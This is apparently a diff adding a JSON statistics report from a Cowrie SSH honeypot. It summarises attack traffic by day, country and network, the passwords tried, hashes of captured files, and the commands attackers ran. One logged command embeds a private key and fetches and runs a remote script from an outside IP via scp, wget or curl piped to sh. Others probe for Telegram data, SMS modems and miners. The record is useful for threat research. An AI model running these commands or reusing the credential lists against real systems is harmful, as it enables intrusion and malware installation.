@@ -1,0 +1,1506 @@
+{
+ "by_day": [
+  {
+   "day": "2026-09-14",
+   "events": 22011,
+   "sessions": 2840,
+   "source_addresses": 77
+  },
+  {
+   "day": "2026-09-15",
+   "events": 72834,
+   "sessions": 9208,
+   "source_addresses": 97
+  },
+  {
+   "day": "2026-09-16",
+   "events": 53938,
+   "sessions": 6852,
+   "source_addresses": 93
+  },
+  {
+   "day": "2026-09-17",
+   "events": 30910,
+   "sessions": 4027,
+   "source_addresses": 112
+  },
+  {
+   "day": "2026-09-18",
+   "events": 40084,
+   "sessions": 5122,
+   "source_addresses": 107
+  },
+  {
+   "day": "2026-09-19",
+   "events": 23,
+   "sessions": 7,
+   "source_addresses": 5
+  }
+ ],
+ "by_hour_utc": [
+  {
+   "events": 12607,
+   "hour": 0,
+   "sessions": 1606
+  },
+  {
+   "events": 4094,
+   "hour": 1,
+   "sessions": 528
+  },
+  {
+   "events": 4508,
+   "hour": 2,
+   "sessions": 579
+  },
+  {
+   "events": 1183,
+   "hour": 3,
+   "sessions": 166
+  },
+  {
+   "events": 540,
+   "hour": 4,
+   "sessions": 83
+  },
+  {
+   "events": 3483,
+   "hour": 5,
+   "sessions": 447
+  },
+  {
+   "events": 8796,
+   "hour": 6,
+   "sessions": 1125
+  },
+  {
+   "events": 6310,
+   "hour": 7,
+   "sessions": 804
+  },
+  {
+   "events": 2769,
+   "hour": 8,
+   "sessions": 413
+  },
+  {
+   "events": 5006,
+   "hour": 9,
+   "sessions": 648
+  },
+  {
+   "events": 1659,
+   "hour": 10,
+   "sessions": 240
+  },
+  {
+   "events": 1199,
+   "hour": 11,
+   "sessions": 166
+  },
+  {
+   "events": 1598,
+   "hour": 12,
+   "sessions": 245
+  },
+  {
+   "events": 5515,
+   "hour": 13,
+   "sessions": 718
+  },
+  {
+   "events": 8573,
+   "hour": 14,
+   "sessions": 1089
+  },
+  {
+   "events": 14019,
+   "hour": 15,
+   "sessions": 1777
+  },
+  {
+   "events": 17841,
+   "hour": 16,
+   "sessions": 2255
+  },
+  {
+   "events": 21466,
+   "hour": 17,
+   "sessions": 2702
+  },
+  {
+   "events": 16708,
+   "hour": 18,
+   "sessions": 2113
+  },
+  {
+   "events": 21845,
+   "hour": 19,
+   "sessions": 2758
+  },
+  {
+   "events": 17704,
+   "hour": 20,
+   "sessions": 2251
+  },
+  {
+   "events": 9201,
+   "hour": 21,
+   "sessions": 1167
+  },
+  {
+   "events": 13619,
+   "hour": 22,
+   "sessions": 1728
+  },
+  {
+   "events": 19557,
+   "hour": 23,
+   "sessions": 2470
+  }
+ ],
+ "clients": [
+  {
+   "client": "SSH-2.0-Go",
+   "hassh": "",
+   "sessions": 27283,
+   "source_addresses": 162
+  },
+  {
+   "client": "SSH-2.0-PuTTY_Release_0.84",
+   "hassh": "",
+   "sessions": 226,
+   "source_addresses": 3
+  },
+  {
+   "client": "SSH-2.0-ZGrab ZGrab SSH Survey",
+   "hassh": "",
+   "sessions": 23,
+   "source_addresses": 23
+  },
+  {
+   "client": "SSH-2.0-libssh2_1.11.1",
+   "hassh": "",
+   "sessions": 20,
+   "source_addresses": 13
+  },
+  {
+   "client": "SSH-2.0-PUTTY",
+   "hassh": "",
+   "sessions": 14,
+   "source_addresses": 5
+  },
+  {
+   "client": "SSH-2.0-Nmap-SSH2-Hostkey",
+   "hassh": "",
+   "sessions": 12,
+   "source_addresses": 2
+  },
+  {
+   "client": "GET / HTTP/1.1",
+   "hassh": "",
+   "sessions": 11,
+   "source_addresses": 11
+  },
+  {
+   "client": "SSH-2.0-paramiko_3.4.1",
+   "hassh": "",
+   "sessions": 8,
+   "source_addresses": 1
+  },
+  {
+   "client": "SSH-2.0-OpenSSH_7.4",
+   "hassh": "",
+   "sessions": 6,
+   "source_addresses": 4
+  },
+  {
+   "client": "SSH-2.0-libssh-0.1",
+   "hassh": "",
+   "sessions": 6,
+   "source_addresses": 3
+  },
+  {
+   "client": "SSH-2.0-Fingerprintx-SSH2",
+   "hassh": "",
+   "sessions": 5,
+   "source_addresses": 5
+  },
+  {
+   "client": "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.8",
+   "hassh": "",
+   "sessions": 5,
+   "source_addresses": 5
+  },
+  {
+   "client": "SSH-2.0-perlssh",
+   "hassh": "",
+   "sessions": 4,
+   "source_addresses": 4
+  },
+  {
+   "client": "MGLNDD_<redacted:honeypot-public-ip>_22",
+   "hassh": "",
+   "sessions": 3,
+   "source_addresses": 3
+  },
+  {
+   "client": "SSH-2.0-libssh2_1.10.0",
+   "hassh": "",
+   "sessions": 3,
+   "source_addresses": 3
+  },
+  {
+   "client": "GET /favicon.ico HTTP/1.1",
+   "hassh": "",
+   "sessions": 2,
+   "source_addresses": 2
+  },
+  {
+   "client": "SSH-1.5-Nmap-SSH1-Hostkey",
+   "hassh": "",
+   "sessions": 2,
+   "source_addresses": 2
+  },
+  {
+   "client": "SSH-1.5-Server",
+   "hassh": "",
+   "sessions": 2,
+   "source_addresses": 2
+  },
+  {
+   "client": "SSH-2.0-Nmap_SSH2_Enum_Algos",
+   "hassh": "",
+   "sessions": 2,
+   "source_addresses": 2
+  },
+  {
+   "client": "SSH-2.0-OPENSSH_7.9",
+   "hassh": "",
+   "sessions": 2,
+   "source_addresses": 1
+  }
+ ],
+ "commands": [
+  {
+   "command": "uname -s -v -n -r -m",
+   "sessions": 22780,
+   "source_addresses": 22,
+   "times": 22780
+  },
+  {
+   "command": "echo xsec",
+   "sessions": 3327,
+   "source_addresses": 3,
+   "times": 3327
+  },
+  {
+   "command": "/bin/./uname -s -v -n -r -m",
+   "sessions": 664,
+   "source_addresses": 6,
+   "times": 664
+  },
+  {
+   "command": "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\")\narch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q \"lm\" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 8\" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 7\" /proc/cpuinfo && echo armv7l ) || echo \"\")\nuptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null)\ncpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null)\ncpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E \"^model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E \"^Hardware\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 )\ngpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null )\nlast_output=$(last 2>/dev/null)\nfilter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'execute_err='; out=$(bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' \"$out\" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; echo '===DONE===' ) 2>&1 )\necho \"UNAME:$uname\"\necho \"ARCH:$arch\"\necho \"UPTIME:$uptime\"\necho \"CPUS:$cpus\"\necho \"CPU_MODEL:$cpu_model\"\necho \"GPU:$gpu_info\"\necho \"LAST:$last_output\"\necho \"FILTER:$filter_output\"",
+   "sessions": 95,
+   "source_addresses": 6,
+   "times": 95
+  },
+  {
+   "command": "echo SHELL_TEST",
+   "sessions": 36,
+   "source_addresses": 1,
+   "times": 36
+  },
+  {
+   "command": "uname -a",
+   "sessions": 16,
+   "source_addresses": 16,
+   "times": 16
+  },
+  {
+   "command": "uname -a; echo -e \"\\x61\\x75\\x74\\x68\\x5F\\x6F\\x6B\\x0A\"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ\n0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg\nAAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9\nCp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=\n-----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no\nUserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@217.60.103.56:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://217.60.103.56/sh || curl -sk https://217.60.103.56/sh) | sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh",
+   "sessions": 6,
+   "source_addresses": 1,
+   "times": 6
+  },
+  {
+   "command": "uname -s -m",
+   "sessions": 6,
+   "source_addresses": 6,
+   "times": 6
+  },
+  {
+   "command": "/ip cloud print",
+   "sessions": 5,
+   "source_addresses": 5,
+   "times": 5
+  },
+  {
+   "command": "cat /proc/cpuinfo",
+   "sessions": 5,
+   "source_addresses": 5,
+   "times": 5
+  },
+  {
+   "command": "echo Hi | cat -n",
+   "sessions": 5,
+   "source_addresses": 5,
+   "times": 5
+  },
+  {
+   "command": "ifconfig",
+   "sessions": 5,
+   "source_addresses": 5,
+   "times": 5
+  },
+  {
+   "command": "locate D877F783D5D3EF8Cs",
+   "sessions": 5,
+   "source_addresses": 5,
+   "times": 5
+  },
+  {
+   "command": "ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*",
+   "sessions": 5,
+   "source_addresses": 5,
+   "times": 5
+  },
+  {
+   "command": "ps -ef | grep '[Mm]iner'",
+   "sessions": 5,
+   "source_addresses": 5,
+   "times": 5
+  },
+  {
+   "command": "ps | grep '[Mm]iner'",
+   "sessions": 5,
+   "source_addresses": 5,
+   "times": 5
+  },
+  {
+   "command": "whoami",
+   "sessions": 4,
+   "source_addresses": 1,
+   "times": 4
+  },
+  {
+   "command": "id -u && echo '---CHECK_SEP---' && uname -a",
+   "sessions": 3,
+   "source_addresses": 1,
+   "times": 3
+  },
+  {
+   "command": "id -u && echo '---OS_RELEASE---' && cat /etc/os-release && echo '---UNAME---' && uname -a",
+   "sessions": 2,
+   "source_addresses": 1,
+   "times": 2
+  },
+  {
+   "command": "echo \"TEST\"; echo -n \"System :\"; lsb_release -d | awk -F':' '{print \" \"$2}'; echo -n \"Apt : \"; which apt; echo -n \"Cpu speed :\"; cat /proc/cpuinfo | grep 'cpu MHz' | uniq | awk -F: '{printf \" %.3f\\n\", $2}'; echo -n \"Cpu count : \"; nproc; echo -n \"Memory : \"; free -h | awk '/Mem:/ {print $2}'",
+   "sessions": 1,
+   "source_addresses": 1,
+   "times": 1
+  }
+ ],
+ "countries": [
+  {
+   "country": "United States",
+   "country_code": "US",
+   "events": 178892,
+   "sessions": 22487,
+   "source_addresses": 130
+  },
+  {
+   "country": "Germany",
+   "country_code": "DE",
+   "events": 19484,
+   "sessions": 2448,
+   "source_addresses": 9
+  },
+  {
+   "country": "Andorra",
+   "country_code": "AD",
+   "events": 4295,
+   "sessions": 558,
+   "source_addresses": 9
+  },
+  {
+   "country": "South Korea",
+   "country_code": "KR",
+   "events": 3124,
+   "sessions": 398,
+   "source_addresses": 17
+  },
+  {
+   "country": "Indonesia",
+   "country_code": "ID",
+   "events": 3059,
+   "sessions": 387,
+   "source_addresses": 4
+  },
+  {
+   "country": "Vietnam",
+   "country_code": "VN",
+   "events": 2998,
+   "sessions": 377,
+   "source_addresses": 5
+  },
+  {
+   "country": "The Netherlands",
+   "country_code": "NL",
+   "events": 2006,
+   "sessions": 273,
+   "source_addresses": 21
+  },
+  {
+   "country": "India",
+   "country_code": "IN",
+   "events": 1986,
+   "sessions": 251,
+   "source_addresses": 3
+  },
+  {
+   "country": "United Kingdom",
+   "country_code": "GB",
+   "events": 1203,
+   "sessions": 250,
+   "source_addresses": 19
+  },
+  {
+   "country": "China",
+   "country_code": "CN",
+   "events": 936,
+   "sessions": 219,
+   "source_addresses": 53
+  },
+  {
+   "country": "Singapore",
+   "country_code": "SG",
+   "events": 1032,
+   "sessions": 160,
+   "source_addresses": 8
+  },
+  {
+   "country": "Belgium",
+   "country_code": "BE",
+   "events": 129,
+   "sessions": 34,
+   "source_addresses": 10
+  },
+  {
+   "country": "France",
+   "country_code": "FR",
+   "events": 82,
+   "sessions": 28,
+   "source_addresses": 13
+  },
+  {
+   "country": "Russia",
+   "country_code": "RU",
+   "events": 83,
+   "sessions": 21,
+   "source_addresses": 10
+  },
+  {
+   "country": "Ukraine",
+   "country_code": "UA",
+   "events": 38,
+   "sessions": 19,
+   "source_addresses": 10
+  },
+  {
+   "country": "Argentina",
+   "country_code": "AR",
+   "events": 36,
+   "sessions": 18,
+   "source_addresses": 10
+  },
+  {
+   "country": "Hong Kong",
+   "country_code": "HK",
+   "events": 65,
+   "sessions": 17,
+   "source_addresses": 9
+  },
+  {
+   "country": "Brazil",
+   "country_code": "BR",
+   "events": 56,
+   "sessions": 9,
+   "source_addresses": 7
+  },
+  {
+   "country": "Canada",
+   "country_code": "CA",
+   "events": 59,
+   "sessions": 9,
+   "source_addresses": 8
+  },
+  {
+   "country": "Spain",
+   "country_code": "ES",
+   "events": 14,
+   "sessions": 7,
+   "source_addresses": 4
+  }
+ ],
+ "credentials": [
+  {
+   "attempts": 83,
+   "password": "",
+   "source_addresses": 5,
+   "username": "admin"
+  },
+  {
+   "attempts": 62,
+   "password": "admin",
+   "source_addresses": 38,
+   "username": "admin"
+  },
+  {
+   "attempts": 45,
+   "password": "123456",
+   "source_addresses": 28,
+   "username": "root"
+  },
+  {
+   "attempts": 45,
+   "password": "root",
+   "source_addresses": 28,
+   "username": "root"
+  },
+  {
+   "attempts": 44,
+   "password": "12345",
+   "source_addresses": 28,
+   "username": "root"
+  },
+  {
+   "attempts": 44,
+   "password": "ubuntu",
+   "source_addresses": 24,
+   "username": "ubuntu"
+  },
+  {
+   "attempts": 43,
+   "password": "admin",
+   "source_addresses": 27,
+   "username": "root"
+  },
+  {
+   "attempts": 43,
+   "password": "user",
+   "source_addresses": 24,
+   "username": "user"
+  },
+  {
+   "attempts": 41,
+   "password": "123",
+   "source_addresses": 25,
+   "username": "root"
+  },
+  {
+   "attempts": 41,
+   "password": "root123",
+   "source_addresses": 24,
+   "username": "root"
+  },
+  {
+   "attempts": 40,
+   "password": "1234",
+   "source_addresses": 25,
+   "username": "root"
+  },
+  {
+   "attempts": 40,
+   "password": "12345678",
+   "source_addresses": 24,
+   "username": "root"
+  },
+  {
+   "attempts": 40,
+   "password": "123456789",
+   "source_addresses": 25,
+   "username": "root"
+  },
+  {
+   "attempts": 40,
+   "password": "1234567890",
+   "source_addresses": 24,
+   "username": "root"
+  },
+  {
+   "attempts": 40,
+   "password": "root@123",
+   "source_addresses": 23,
+   "username": "root"
+  },
+  {
+   "attempts": 39,
+   "password": "Admin@123",
+   "source_addresses": 22,
+   "username": "admin"
+  },
+  {
+   "attempts": 39,
+   "password": "admin123",
+   "source_addresses": 23,
+   "username": "admin"
+  },
+  {
+   "attempts": 39,
+   "password": "node",
+   "source_addresses": 18,
+   "username": "node"
+  },
+  {
+   "attempts": 39,
+   "password": "abc123",
+   "source_addresses": 23,
+   "username": "root"
+  },
+  {
+   "attempts": 39,
+   "password": "password",
+   "source_addresses": 22,
+   "username": "root"
+  }
+ ],
+ "enrichment": {
+  "addresses_with_asn": 398,
+  "addresses_without_asn": 17,
+  "events_with_asn": 46130,
+  "events_with_country": 219800,
+  "events_without_asn": 173670
+ },
+ "excluded": {
+  "events": 48,
+  "note": "Traffic from my own lab and from private ranges is excluded by the query, not by editing the results afterwards. The addresses come from the same file that the redaction guard reads, so a figure can never be built from traffic that would then be refused publication.",
+  "own_addresses_excluded": 2,
+  "private_ranges_excluded": 9,
+  "sessions": 10,
+  "source_addresses": 1
+ },
+ "file_events": [
+  {
+   "address": "118.145.118.102",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "97a1e6f817d44a4f8b07fdebaf9357786742096c470eb5d78e789b6bb53979bb",
+   "timestamp": "2026-09-14 07:36:16.991222",
+   "url": ""
+  },
+  {
+   "address": "106.13.98.129",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "timestamp": "2026-09-14 10:05:08.174484",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-15 21:37:56.931080",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-15 21:37:56.931565",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-16 11:29:51.735960",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-16 11:29:51.736361",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-16 17:26:47.216493",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-16 17:26:47.216825",
+   "url": ""
+  },
+  {
+   "address": "77.90.185.20",
+   "country_code": "DE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-16 19:25:50.086541",
+   "url": ""
+  },
+  {
+   "address": "77.90.185.20",
+   "country_code": "DE",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-16 19:25:50.086933",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-17 01:23:10.553440",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-17 01:23:10.553897",
+   "url": ""
+  },
+  {
+   "address": "42.101.43.119",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5",
+   "timestamp": "2026-09-17 10:09:32.921553",
+   "url": ""
+  },
+  {
+   "address": "183.71.242.250",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "9ecbeee2c88e701fe3d39e868c0a102cc77c033775f8fa9625ae83e9150a2a50",
+   "timestamp": "2026-09-17 14:34:19.471282",
+   "url": ""
+  },
+  {
+   "address": "38.248.12.122",
+   "country_code": "US",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "9ecbeee2c88e701fe3d39e868c0a102cc77c033775f8fa9625ae83e9150a2a50",
+   "timestamp": "2026-09-17 16:19:10.850938",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-17 17:41:03.357614",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-17 17:41:03.357996",
+   "url": ""
+  },
+  {
+   "address": "106.12.148.154",
+   "country_code": "CN",
+   "event": "cowrie.session.file_upload",
+   "filename": "sshd",
+   "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
+   "timestamp": "2026-09-17 20:56:19.990385",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "00b6f15c2274420217ed3098a9f5f00545bf1793d7a324fd18a7809cbbf5b12b",
+   "timestamp": "2026-09-18 12:57:20.084070",
+   "url": ""
+  },
+  {
+   "address": "130.12.180.51",
+   "country_code": "NL",
+   "event": "cowrie.session.file_download",
+   "filename": "",
+   "sha256": "43728fbfb98bb39ff61a2db0fc2905bd6937997062b05b9ab8b186fdee18c09a",
+   "timestamp": "2026-09-18 12:57:20.084466",
+   "url": ""
+  }
+ ],
+ "logins": {
+  "accepted": 27229,
+  "distinct_passwords": 2322,
+  "distinct_usernames": 649,
+  "refused": 168
+ },
+ "meta": {
+  "sanitised_values": {
+   "honeypot-public-ip": 1
+  },
+  "schema_version": 1,
+  "source": "nsm.cowrie_events",
+  "top_n": 20,
+  "window_end": "2026-09-19 00:36:14.403568",
+  "window_start": "2026-09-14 05:57:05.761100"
+ },
+ "networks": [
+  {
+   "as_org": "LLC Rusbuilding",
+   "asn": 199458,
+   "events": 19109,
+   "sessions": 2389,
+   "source_addresses": 1
+  },
+  {
+   "as_org": "Wowrack.com",
+   "asn": 27323,
+   "events": 4605,
+   "sessions": 576,
+   "source_addresses": 1
+  },
+  {
+   "as_org": "TECHOFF SRV LIMITED",
+   "asn": 48090,
+   "events": 4283,
+   "sessions": 555,
+   "source_addresses": 8
+  },
+  {
+   "as_org": "Alibaba (US) Technology Co., Ltd.",
+   "asn": 45102,
+   "events": 3762,
+   "sessions": 501,
+   "source_addresses": 8
+  },
+  {
+   "as_org": "UNMANAGED LTD",
+   "asn": 47890,
+   "events": 2649,
+   "sessions": 428,
+   "source_addresses": 9
+  },
+  {
+   "as_org": "UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED",
+   "asn": 135377,
+   "events": 3090,
+   "sessions": 396,
+   "source_addresses": 5
+  },
+  {
+   "as_org": "VIET DIGITAL TECHNOLOGY LIABILITY COMPANY",
+   "asn": 135918,
+   "events": 2984,
+   "sessions": 373,
+   "source_addresses": 1
+  },
+  {
+   "as_org": "Wan and lan Internet Pvt.Ltd",
+   "asn": 55862,
+   "events": 1974,
+   "sessions": 248,
+   "source_addresses": 1
+  },
+  {
+   "as_org": "Beijing Volcano Engine Technology Co., Ltd.",
+   "asn": 137718,
+   "events": 625,
+   "sessions": 134,
+   "source_addresses": 7
+  },
+  {
+   "as_org": "Google LLC",
+   "asn": 396982,
+   "events": 566,
+   "sessions": 113,
+   "source_addresses": 44
+  },
+  {
+   "as_org": "DigitalOcean, LLC",
+   "asn": 14061,
+   "events": 459,
+   "sessions": 66,
+   "source_addresses": 11
+  },
+  {
+   "as_org": "Akamai Technologies, Inc.",
+   "asn": 63949,
+   "events": 132,
+   "sessions": 46,
+   "source_addresses": 24
+  },
+  {
+   "as_org": "Verein zur Foerderung eines Deutschen Forschungsnetzes e.V.",
+   "asn": 680,
+   "events": 320,
+   "sessions": 41,
+   "source_addresses": 1
+  },
+  {
+   "as_org": "CHINA UNICOM China169 Backbone",
+   "asn": 4837,
+   "events": 105,
+   "sessions": 23,
+   "source_addresses": 10
+  },
+  {
+   "as_org": "Hangzhou Alibaba Advertising Co.,Ltd.",
+   "asn": 37963,
+   "events": 53,
+   "sessions": 19,
+   "source_addresses": 15
+  },
+  {
+   "as_org": "Amazon.com, Inc.",
+   "asn": 16509,
+   "events": 63,
+   "sessions": 17,
+   "source_addresses": 3
+  },
+  {
+   "as_org": "BANATSYNC SRL",
+   "asn": 198364,
+   "events": 45,
+   "sessions": 16,
+   "source_addresses": 5
+  },
+  {
+   "as_org": "Korea Telecom",
+   "asn": 4766,
+   "events": 68,
+   "sessions": 14,
+   "source_addresses": 14
+  },
+  {
+   "as_org": "ONYPHE SAS",
+   "asn": 213412,
+   "events": 34,
+   "sessions": 12,
+   "source_addresses": 11
+  },
+  {
+   "as_org": "Hurricane Electric LLC",
+   "asn": 6939,
+   "events": 36,
+   "sessions": 11,
+   "source_addresses": 9
+  }
+ ],
+ "passwords": [
+  {
+   "attempts": 1749,
+   "password": "123456",
+   "source_addresses": 37
+  },
+  {
+   "attempts": 778,
+   "password": "123",
+   "source_addresses": 31
+  },
+  {
+   "attempts": 611,
+   "password": "1234",
+   "source_addresses": 34
+  },
+  {
+   "attempts": 424,
+   "password": "1",
+   "source_addresses": 24
+  },
+  {
+   "attempts": 412,
+   "password": "12345678",
+   "source_addresses": 28
+  },
+  {
+   "attempts": 353,
+   "password": "password",
+   "source_addresses": 29
+  },
+  {
+   "attempts": 302,
+   "password": "root",
+   "source_addresses": 28
+  },
+  {
+   "attempts": 240,
+   "password": "12345",
+   "source_addresses": 32
+  },
+  {
+   "attempts": 230,
+   "password": "123456789",
+   "source_addresses": 29
+  },
+  {
+   "attempts": 197,
+   "password": "admin",
+   "source_addresses": 45
+  },
+  {
+   "attempts": 147,
+   "password": "1qaz@WSX",
+   "source_addresses": 21
+  },
+  {
+   "attempts": 135,
+   "password": "abc123",
+   "source_addresses": 23
+  },
+  {
+   "attempts": 124,
+   "password": "admin123",
+   "source_addresses": 27
+  },
+  {
+   "attempts": 110,
+   "password": "123123",
+   "source_addresses": 19
+  },
+  {
+   "attempts": 108,
+   "password": "passwd",
+   "source_addresses": 18
+  },
+  {
+   "attempts": 103,
+   "password": "test",
+   "source_addresses": 23
+  },
+  {
+   "attempts": 102,
+   "password": "1234567890",
+   "source_addresses": 25
+  },
+  {
+   "attempts": 102,
